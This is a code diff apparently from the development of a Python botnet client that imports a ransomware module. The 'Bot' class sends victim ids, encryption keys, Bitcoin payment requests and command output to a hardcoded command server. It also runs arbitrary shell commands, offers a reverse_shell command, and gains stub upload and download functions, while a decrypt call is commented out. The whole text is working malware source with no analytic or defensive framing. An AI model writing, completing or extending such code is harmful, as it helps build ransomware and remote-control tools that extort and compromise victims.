@@ -12,12 +12,11 @@ import os
 from subprocess import check_output
 import ctypes
 import ransomware
-class Bot(object):
-    
 
+class Bot(object):
     def __init__(self):
         self.platform = platform.system()
-        self.uid = "2315"
+        self.uid = uuid.uuid1()
         self.username = self.curr_user()
         self.hostname = socket.gethostname()
         self.ransom = False
@@ -42,6 +41,7 @@ class Bot(object):
         return r.text
     def send_key(self, key):
         r = requests.post("http://192.168.1.122" + '/api/' + self.uid + '/lock', data= {'key':key})
+        return r.text
 
     def request_key(self, btc_addr):
         r = requests.post("http://192.168.1.122" + '/api/' + self.uid + '/pay', data={'btc_addr':btc_addr})
@@ -50,12 +50,23 @@ class Bot(object):
 
     def send_output(self, output):
         r = requests.post("http://192.168.1.122" + '/api/' + self.uid + '/report', data= {'output':output})
+        return r.text
 
     def run_command(self,command):
         if self.platform == "Windows":
             out = check_output(command, shell=True).decode()
             print(out)
             self.send_output(out)
+
+    def upload(self, file):
+        r = "end"
+        return r
+    
+    def download(self, source_url, dest):
+        r = "end"
+        return r
+
+
 
     def run(self):
         
@@ -65,12 +76,12 @@ class Bot(object):
             print(job)
             syn = len(job) > 1
             cmdarr = job.split(" ")
-
+            btc_addr = "asdgasr"
             if self.ransom:
                 got_key = self.request_key(btc_addr)
                 if got_key:
 
-                    ransomware.decrypt_all_dir(got_key)
+                    #ransomware.decrypt_all_dir("C:\\Users\\", got_key)
                     self.ransom = False
 
 
@@ -97,7 +108,7 @@ class Bot(object):
                 if len(job) == 3:
                     self.reverse_shell(job[1], job[2])
                 else:
-                    self.send.output("incorrect num of args: reverse_shell <dest_addr> <bind_port>")
+                    self.send_output("incorrect num of args: reverse_shell <dest_addr> <bind_port>")
             elif cmdarr[0] == "display_message":
                 if len(job) > 1:
                     self.display_message(job.split("'"))
